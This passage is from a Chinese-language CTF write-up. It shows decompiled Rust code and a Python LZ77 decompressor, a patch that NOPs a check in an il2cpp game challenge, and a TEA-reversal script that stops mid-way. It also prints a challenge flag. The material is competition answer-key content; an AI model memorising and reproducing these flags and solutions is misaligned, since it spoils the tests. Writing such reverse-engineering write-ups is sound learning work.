v19 = v32 - v30 + <span class="number">8</span>;</span><br><span class="line">                                          v36 = <span class="number">8LL</span>;</span><br><span class="line">                                          <span class="keyword">if</span> ( v19 &lt; v22 )</span><br><span class="line">                                          &#123;</span><br><span class="line">                                            v19 = *(v20 - v30 - <span class="number">6</span>);</span><br><span class="line">                                            v18 = v63[v86];</span><br><span class="line">                                            v36 = (v19 != v18) ^ <span class="number">9LL</span>;</span><br><span class="line">                                            <span class="keyword">if</span> ( v19 == v18 &amp;&amp; v85 &lt; v22 )</span><br><span class="line">                                            &#123;</span><br><span class="line">                                              v19 = v32 - v30 + <span class="number">9</span>;</span><br><span class="line">                                              v36 = <span class="number">9LL</span>;</span><br><span class="line">                                              <span class="keyword">if</span> ( v19 &lt; v22 )</span><br><span class="line">                                              &#123;</span><br><span class="line">                                                v19 = *(v20 - v30 - <span class="number">5</span>);</span><br><span class="line">                                                v18 = v63[v85];</span><br><span class="line">                                                v36 = (v19 == v18) + <span class="number">9LL</span>;</span><br><span class="line">                                                <span class="keyword">if</span> ( v19 == v18 &amp;&amp; v84 &lt; v22 )</span><br><span class="line">                                                &#123;</span><br><span class="line">                                                  v19 = v32 - v30 + <span class="number">10</span>;</span><br><span class="line">                                                  v36 = <span class="number">10LL</span>;</span><br><span class="line">                                                  <span class="keyword">if</span> ( v19 &lt; v22 )</span><br><span class="line">                                                  &#123;</span><br><span class="line">                                                    v19 = *(v20 - v30 - <span class="number">4</span>);</span><br><span class="line">                                                    v18 = v63[v84];</span><br><span class="line">                                                    v36 = (v19 != v18) ^ <span class="number">0xBLL</span>;</span><br><span class="line">                                                    <span class="keyword">if</span> ( v19 == v18 &amp;&amp; v83 &lt; v22 )</span><br><span class="line">                                                    &#123;</span><br><span class="line">                                                      v19 = v32 - v30 + <span class="number">11</span>;</span><br><span class="line">                                                      v36 = <span class="number">11LL</span>;</span><br><span class="line">                                                      <span class="keyword">if</span> ( v19 &lt; v22 )</span><br><span class="line">                                                      &#123;</span><br><span class="line">                                                        v19 = *(v20 - v30 - <span class="number">3</span>);</span><br><span class="line">                                                        v18 = v63[v83];</span><br><span class="line">                                                        v36 = (v19 == v18) + <span class="number">11LL</span>;</span><br><span class="line">                                                        <span class="keyword">if</span> ( v19 == v18 &amp;&amp; v82 &lt; v22 )</span><br><span class="line">                                                        &#123;</span><br><span class="line">                                                          v19 = v32 - v30 + <span class="number">12</span>;</span><br><span class="line">                                                          v36 = <span class="number">12LL</span>;</span><br><span class="line">                                                          <span class="keyword">if</span> ( v19 &lt; v22 )</span><br><span class="line">                                                          &#123;</span><br><span class="line">                                                            v19 = *(v20 - v30 - <span class="number">2</span>);</span><br><span class="line">                                                            v18 = v63[v82];</span><br><span class="line">                                                            v36 = (v19 != v18) ^ <span class="number">0xDLL</span>;</span><br><span class="line">                                                            <span class="keyword">if</span> ( v19 == v18 &amp;&amp; v81 &lt; v22 )</span><br><span class="line">                                                            &#123;</span><br><span class="line">                                                              v19 = v32 - v30 + <span class="number">13</span>;</span><br><span class="line">                                                              v36 = <span class="number">13LL</span>;</span><br><span class="line">                                                              <span class="keyword">if</span> ( v19 &lt; v22 )</span><br><span class="line">                                                              &#123;</span><br><span class="line">                                                                v19 = *(v20 - v30 - <span class="number">1</span>);</span><br><span class="line">                                                                v18 = v63[v81];</span><br><span class="line">                                                                v36 = (v19 == v18) + <span class="number">13LL</span>;</span><br><span class="line">                                                                <span class="keyword">if</span> ( v19 == v18 &amp;&amp; v80 &lt; v22 )</span><br><span class="line">                                                                &#123;</span><br><span class="line">                                                                  v19 = v32 - v30 + <span class="number">14</span>;</span><br><span class="line">                                                                  v36 = <span class="number">14LL</span>;</span><br><span class="line">                                                                  <span class="keyword">if</span> ( v19 &lt; v22 )</span><br><span class="line">                                                                  &#123;</span><br><span class="line">                                                                    v18 = v63;</span><br><span class="line">                                                                    v19 = v80;</span><br><span class="line">                                                                    v36 = (*(v20 - v30) == v63[v80]) | <span class="number">0xELL</span>;</span><br><span class="line">                                                                  &#125;</span><br><span class="line">                                                                &#125;</span><br><span class="line">                                                              &#125;</span><br><span class="line">                                                            &#125;</span><br><span class="line">                                                          &#125;</span><br><span class="line">                                                        &#125;</span><br><span class="line">                                                      &#125;</span><br><span class="line">                                                    &#125;</span><br><span class="line">                                                  &#125;</span><br><span class="line">                                                &#125;</span><br><span class="line">                                              &#125;</span><br><span class="line">                                            &#125;</span><br><span class="line">                                          &#125;</span><br><span class="line">                                        &#125;</span><br><span class="line">                                      &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                  &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                              &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                          &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">LOBYTE</span>(v18) = v36 &gt; v33;</span><br><span class="line">          <span class="keyword">if</span> ( v36 &gt; v33 &amp;&amp; v35 )</span><br><span class="line">          &#123;</span><br><span class="line">            v34 = v30 + v31;</span><br><span class="line">            v33 = v36;</span><br><span class="line">          &#125;</span><br><span class="line">          ++v20;</span><br><span class="line">          ++v32;</span><br><span class="line">          --v31;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( -v30 != v31 );</span><br><span class="line">        v37 = buf[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> ( v33 &lt; <span class="number">3</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_98;</span><br><span class="line">        <span class="keyword">if</span> ( v65 == buf[<span class="number">0</span>] )</span><br><span class="line">          alloc::raw_vec::RawVec$LT$T$C$A$GT$::grow_one::<span class="built_in">h2ec2bdbfaa8067b2</span>(buf);</span><br><span class="line">        v21 = buf[<span class="number">1</span>];</span><br><span class="line">        *(buf[<span class="number">1</span>] + v65) = (v34 &gt;&gt; <span class="number">4</span>) | <span class="number">0x80</span>;</span><br><span class="line">        v38 = v65 + <span class="number">1</span>;</span><br><span class="line">        *v67 = v65 + <span class="number">1</span>;</span><br><span class="line">        v39 = (<span class="number">16</span> * v34) | v33;</span><br><span class="line">        <span class="keyword">if</span> ( (v65 + <span class="number">1</span>) != buf[<span class="number">0</span>] )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">LABEL_97:</span><br><span class="line">        alloc::raw_vec::RawVec$LT$T$C$A$GT$::grow_one::<span class="built_in">h2ec2bdbfaa8067b2</span>(buf);</span><br><span class="line">LABEL_34:</span><br><span class="line">        *(buf[<span class="number">1</span>] + v38) = v39;</span><br><span class="line">        v65 = v38 + <span class="number">1</span>;</span><br><span class="line">        *v67 = v38 + <span class="number">1</span>;</span><br><span class="line">        v26 += v33;</span><br><span class="line">        <span class="keyword">if</span> ( v26 &gt;= v22 )</span><br><span class="line">        &#123;</span><br><span class="line">          v40 = buf[<span class="number">0</span>];</span><br><span class="line">          v25 = buf[<span class="number">1</span>];</span><br><span class="line">          <span class="keyword">goto</span> LABEL_102;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      v37 = buf[<span class="number">0</span>];</span><br><span class="line">LABEL_98:</span><br><span class="line">      v38 = v65;</span><br><span class="line">      v21 = v63;</span><br><span class="line">      v39 = v63[v26];</span><br><span class="line">      v33 = <span class="number">1LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v65 != v37 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_97;</span><br><span class="line">    &#125;</span><br><span class="line">    *&amp;v65 = <span class="number">0.0</span>;</span><br><span class="line">    v40 = <span class="number">0LL</span>;</span><br><span class="line">LABEL_102:</span><br><span class="line">    v75 = *&amp;v22;</span><br><span class="line">    v72 = &amp;v75;</span><br><span class="line">    v73 = core::fmt::num::imp::_$LT$impl$u20$core..fmt..Display$u20$<span class="keyword">for</span>$u20$usize$GT$::fmt::hb55abab394fd8017;</span><br><span class="line">    buf[<span class="number">0</span>] = &amp;off_5F328;</span><br><span class="line">    buf[<span class="number">1</span>] = &amp;dword_0 + <span class="number">2</span>;</span><br><span class="line">    *&amp;v67[<span class="number">16</span>] = <span class="number">0LL</span>;</span><br><span class="line">    *v67 = &amp;v72;</span><br><span class="line">    *&amp;v67[<span class="number">8</span>] = <span class="number">1LL</span>;</span><br><span class="line">    std::io::stdio::_print::<span class="built_in">h3fda082316a9dfcb</span>(buf, v18, v19, v21, v20);</span><br><span class="line">    v75 = *&amp;v65;</span><br><span class="line">    v72 = &amp;v75;</span><br><span class="line">    v73 = core::fmt::num::imp::_$LT$impl$u20$core..fmt..Display$u20$<span class="keyword">for</span>$u20$usize$GT$::fmt::hb55abab394fd8017;</span><br><span class="line">    buf[<span class="number">0</span>] = &amp;off_5F348;</span><br><span class="line">    buf[<span class="number">1</span>] = &amp;dword_0 + <span class="number">2</span>;</span><br><span class="line">    *&amp;v67[<span class="number">16</span>] = <span class="number">0LL</span>;</span><br><span class="line">    *v67 = &amp;v72;</span><br><span class="line">    *&amp;v67[<span class="number">8</span>] = <span class="number">1LL</span>;</span><br><span class="line">    std::io::stdio::_print::<span class="built_in">h3fda082316a9dfcb</span>(buf, v18, v41, v42, v43);</span><br><span class="line">    <span class="keyword">if</span> ( *&amp;v22 != <span class="number">0.0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v75 = (<span class="number">1.0</span> - v65 / v22) * <span class="number">100.0</span>;</span><br><span class="line">      v72 = &amp;v75;</span><br><span class="line">      v73 = core::fmt::<span class="type">float</span>::_$LT$impl$u20$core..fmt..Display$u20$<span class="keyword">for</span>$u20$f64$GT$::fmt::hbc<span class="number">422e71329</span>d5d34;</span><br><span class="line">      buf[<span class="number">0</span>] = &amp;off_5F368;</span><br><span class="line">      buf[<span class="number">1</span>] = &amp;dword_0 + <span class="number">2</span>;</span><br><span class="line">      *&amp;v67[<span class="number">16</span>] = &amp;off_8FE8;</span><br><span class="line">      v68 = <span class="number">1LL</span>;</span><br><span class="line">      *v67 = &amp;v72;</span><br><span class="line">      *&amp;v67[<span class="number">8</span>] = <span class="number">1LL</span>;</span><br><span class="line">      std::io::stdio::_print::<span class="built_in">h3fda082316a9dfcb</span>(buf, v18, v44, v45, v46);</span><br><span class="line">    &#125;</span><br><span class="line">    v17 = v70;</span><br><span class="line">    v47 = v70[<span class="number">8</span>];</span><br><span class="line">    v51 = std::fs::write::inner::<span class="built_in">hef6adfd32e013394</span>(v70[<span class="number">7</span>], v47, v25, v65);</span><br><span class="line">    <span class="keyword">if</span> ( v40 )</span><br><span class="line">    &#123;</span><br><span class="line">      v47 = v40;</span><br><span class="line">      <span class="built_in">RNvCsiGVaDesi5rv_7___rustc14___rust_dealloc</span>(v25, v40, <span class="number">1LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !v51 )</span><br><span class="line">    &#123;</span><br><span class="line">      v72 = &amp;v93;</span><br><span class="line">      v73 = _$LT$$RF$T$u20$as$u20$core..fmt..Display$GT$::fmt::hc71fee<span class="number">03e70</span>ac9c0;</span><br><span class="line">      buf[<span class="number">0</span>] = &amp;off_5F388;</span><br><span class="line">      buf[<span class="number">1</span>] = &amp;dword_0 + <span class="number">2</span>;</span><br><span class="line">      *&amp;v67[<span class="number">16</span>] = <span class="number">0LL</span>;</span><br><span class="line">      *v67 = &amp;v72;</span><br><span class="line">      *&amp;v67[<span class="number">8</span>] = <span class="number">1LL</span>;</span><br><span class="line">      v16 = v71;</span><br><span class="line">      v55 = v69;</span><br><span class="line">      std::io::stdio::_print::<span class="built_in">h3fda082316a9dfcb</span>(buf, v47, v48, v49, v50);</span><br><span class="line">      <span class="keyword">if</span> ( v55 )</span><br><span class="line">        <span class="built_in">RNvCsiGVaDesi5rv_7___rustc14___rust_dealloc</span>(v63, v55, <span class="number">1LL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( *v17 )</span><br><span class="line">        <span class="built_in">RNvCsiGVaDesi5rv_7___rustc14___rust_dealloc</span>(v17[<span class="number">1</span>], *v17, <span class="number">1LL</span>);</span><br><span class="line">      v56 = v17[<span class="number">3</span>];</span><br><span class="line">      <span class="keyword">if</span> ( v56 )</span><br><span class="line">        <span class="built_in">RNvCsiGVaDesi5rv_7___rustc14___rust_dealloc</span>(v17[<span class="number">4</span>], v56, <span class="number">1LL</span>);</span><br><span class="line">      v57 = v17[<span class="number">6</span>];</span><br><span class="line">      <span class="keyword">if</span> ( v57 )</span><br><span class="line">        <span class="built_in">RNvCsiGVaDesi5rv_7___rustc14___rust_dealloc</span>(v17[<span class="number">7</span>], v57, <span class="number">1LL</span>);</span><br><span class="line">      v63 = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v16 != <span class="number">0.0</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_117;</span><br><span class="line">      <span class="keyword">return</span> v63;</span><br><span class="line">    &#125;</span><br><span class="line">    v16 = v71;</span><br><span class="line">    <span class="keyword">if</span> ( v69 )</span><br><span class="line">      <span class="built_in">RNvCsiGVaDesi5rv_7___rustc14___rust_dealloc</span>(v63, v69, <span class="number">1LL</span>);</span><br><span class="line">    v63 = v51;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *v17 )</span><br><span class="line">    <span class="built_in">RNvCsiGVaDesi5rv_7___rustc14___rust_dealloc</span>(v17[<span class="number">1</span>], *v17, <span class="number">1LL</span>);</span><br><span class="line">  v52 = v17[<span class="number">3</span>];</span><br><span class="line">  <span class="keyword">if</span> ( v52 )</span><br><span class="line">    <span class="built_in">RNvCsiGVaDesi5rv_7___rustc14___rust_dealloc</span>(v17[<span class="number">4</span>], v52, <span class="number">1LL</span>);</span><br><span class="line">  v53 = v17[<span class="number">6</span>];</span><br><span class="line">  <span class="keyword">if</span> ( v53 )</span><br><span class="line">    <span class="built_in">RNvCsiGVaDesi5rv_7___rustc14___rust_dealloc</span>(v17[<span class="number">7</span>], v53, <span class="number">1LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v16 != <span class="number">0.0</span> )</span><br><span class="line">LABEL_117:</span><br><span class="line">    <span class="built_in">RNvCsiGVaDesi5rv_7___rustc14___rust_dealloc</span>(v17, <span class="number">24LL</span> * *&amp;v16, <span class="number">8LL</span>);</span><br><span class="line">  <span class="keyword">return</span> v63;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数内是一个完整的压缩工具实现代码，应该是一个 <strong>LZ77 &#x2F; LZSS 风格的滑动窗口压缩程序</strong>，经ai分析后是一个 <strong>LZ77</strong> 的变体压缩算法，因此要得到flag就要逆向压缩算法后写解压代码，得到原始文件</p>
<p><strong>EXP：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decompress</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.read()</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;错误: 找不到文件 <span class="subst">&#123;input_file&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    out = <span class="built_in">bytearray</span>()</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(data):</span><br><span class="line">        b1 = data[i]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查是否匹配压缩特征 (对应逆向中的 0x80 标志)</span></span><br><span class="line">        <span class="keyword">if</span> b1 &amp; <span class="number">0x80</span>:</span><br><span class="line">            <span class="keyword">if</span> i + <span class="number">1</span> &gt;= <span class="built_in">len</span>(data):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            b2 = data[i + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 根据逆向逻辑还原长度和距离</span></span><br><span class="line">            <span class="comment"># v33 是长度 (Length), v34 是距离 (Distance)</span></span><br><span class="line">            <span class="comment"># 逆向中: B1 = (v34 &gt;&gt; 4) | 0x80, B2 = (16 * v34) | v33</span></span><br><span class="line"></span><br><span class="line">            length = b2 &amp; <span class="number">0x0F</span></span><br><span class="line">            <span class="comment"># 还原距离：将 B1 的低 4 位作为高位，B2 的高 4 位作为低位</span></span><br><span class="line">            distance = ((b1 &amp; <span class="number">0x7F</span>) &lt;&lt; <span class="number">4</span>) | (b2 &gt;&gt; <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 从当前输出流回溯复制</span></span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">                <span class="keyword">if</span> distance &lt;= <span class="built_in">len</span>(out):</span><br><span class="line">                    target_byte = out[-distance]</span><br><span class="line">                    out.append(target_byte)</span><br><span class="line"></span><br><span class="line">            i += <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 字面量：直接写入 (对应逆向中 v33=1 的逻辑)</span></span><br><span class="line">            out.append(b1)</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(out)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;解压完成! 原始大小: <span class="subst">&#123;<span class="built_in">len</span>(data)&#125;</span> 字节, 解压后: <span class="subst">&#123;<span class="built_in">len</span>(out)&#125;</span> 字节&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 使用方法: python decompress.py out1.z flag.txt</span></span><br><span class="line">    input_path = <span class="string">&quot;out1.z&quot;</span></span><br><span class="line">    output_path = <span class="string">&quot;flag_recovered&quot;</span></span><br><span class="line">    decompress(input_path, output_path)</span><br></pre></td></tr></table></figure>

<p>运行代码后能得到一个<code>flag_recovered</code>原始文件，用vscode打开文件就能看到flag了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=OTc3OWQ2NWQ5YWRlMmQ1YTNlYjNkYTRhYzYyNjIxMmJfd1ZjSHpkUllyaTAyVHBuZ2ExM0V3V1VJWWl0UmpjaVVfVG9rZW46VVowb2JGMlNab0lDcnJ4OGxMMWNZU3V5bjNqXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<h3 id="原神！启动！"><a href="#原神！启动！" class="headerlink" title="原神！启动！"></a>原神！启动！</h3><p>打开文件目测是个il2cpp的c#游戏，文件夹里果然找不到<code>Assembly-CSharp.dll</code>文件</p>
<p>然后就是走il2cpp的逆向流程获取到这个文件，用dnspy打开看到关键函数<code>GachaManager()</code>及它的偏移地址</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=NTgzYTMzYjVmYzE1YjljY2U3NjkwN2VmMDFhY2FjMDFfcllwWGtXajkzZjNabVNyaUVpZ0J1SjNjc0ZBT2Jnc2lfVG9rZW46VFlmMmIydHBEb040U1N4RFZoOGNRZWlPbjFnXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>回去用ida打开<code>GameAssembly.dll</code>文件恢复符号表，等待它完全恢复后在函数表搜索manager找到关键函数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=MGQyYzM5MzE1ODkzMGFiYjU2NmRkNTQ4Y2Q5NzFhYjJfUG9kb3BiNzY5aFFOcmw1NHZJWDVzYTIzVE5uU2QwTU5fVG9rZW46VWgybGJ0b2FibzFOMFh4SEVPQWNiU3ppbnRoXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>发现函数表里有个AES解密函数，跟进找到调用解密的地方，只有满足前面的if条件判断才能运行正确的解密函数，所以解题思路就是把条件判断nop掉，再把文件替换回去重新运行游戏</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=OTkxYjc2M2MxMWVhNGM4NmNiODI4ODlmNzFlOWVkYWNfb2pwWGY2eU9PdXoySGcxRmRDMFJ6aG1pdUxYVUwwbDNfVG9rZW46Ukl6NmJ5eDd6b1hKYnV4MlNWNGNQOVhObnBnXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>这样不管抽到的是不是钟离都能得到flag了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=NmY5MmM1YTE5MWZjNDc1MjM2MDVmMjUyMjcxNDkyYjJfRVVCMUNrY3lQazVYYU1hRnJvRTdDZld3WlNRdjh3UVRfVG9rZW46V2ZvRmJrT21Eb2NPM3l4cmlnV2M0dFE0bkpmXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<h3 id="Strange-Py"><a href="#Strange-Py" class="headerlink" title="Strange_Py"></a>Strange_Py</h3><h4 id="逆向分析总结"><a href="#逆向分析总结" class="headerlink" title="逆向分析总结"></a>逆向分析总结</h4><ol>
<li><strong>识别程序</strong>: 目标 encrypt.exe 是一个 PyInstaller 打包的 Python 3.9 程序。</li>
<li><strong>提取核心逻辑</strong>:<ol>
<li>提取了 PYZ.pyz 归档文件，并从中提取了 tea.pyc。</li>
<li>发现加密逻辑依赖于一个原生扩展模块 Eencrypt.cp39-win_amd64.pyd。</li>
</ol>
</li>
<li><strong>算法分析</strong>:<ol>
<li><code>tea.py</code> 中的 <code>encoded</code> 函数实际上执行了一个<strong>逆向的 TEA 算法循环</strong>（使用了 <code>-=</code> 操作），并将加密后的数据混淆后打包。</li>
<li><code>Eencrypt.encryption</code> 函数实际上并未进行强加密，而是将生成的 16 字节随机密钥（Key）和后缀（Suffix）附加到文件末尾。</li>
</ol>
</li>
<li><strong>解密方案</strong>:<ol>
<li>从 flag.enc 文件末尾提取全局 Key 和 Suffix。</li>
<li>将 Payload 分割为 16 字节的块（8字节数据 + 8字节掩码）。</li>
<li>逆向 <code>tea.py</code> 的逻辑（即执行正向 TEA 加密循环）还原原始数据的 Hex 字符串。</li>
<li>通过 XOR 掩码还原原始字节。</li>
</ol>
</li>
</ol>
<p>Flag 结果</p>
<p>解密 flag.enc 后得到了一个 Windows 可执行文件 flag_decoded.exe。运行该程序输出：</p>
<p><strong>Flag:</strong> <code>Unictf&#123;W0OL!!!_Y0uh@Ve_fOuNd_mE&#125;</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> Eencrypt</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.enc&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Hypothesis: Suffix is 13 bytes.</span></span><br><span class="line">    <span class="comment"># Key is 16 bytes before suffix.</span></span><br><span class="line">    suffix_len = <span class="number">13</span></span><br><span class="line">    key_len = <span class="number">16</span></span><br><span class="line">    overhead = suffix_len + key_len <span class="comment"># 29</span></span><br><span class="line">    </span><br><span class="line">    payload_data = data[:-overhead]</span><br><span class="line">    global_key_bytes = data[-overhead : -suffix_len]</span><br><span class="line">    suffix_data = data[-suffix_len:]</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Payload Len: <span class="subst">&#123;<span class="built_in">len</span>(payload_data)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Key Hex: <span class="subst">&#123;global_key_bytes.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Suffix Hex: <span class="subst">&#123;suffix_data.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(payload_data) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">        <span 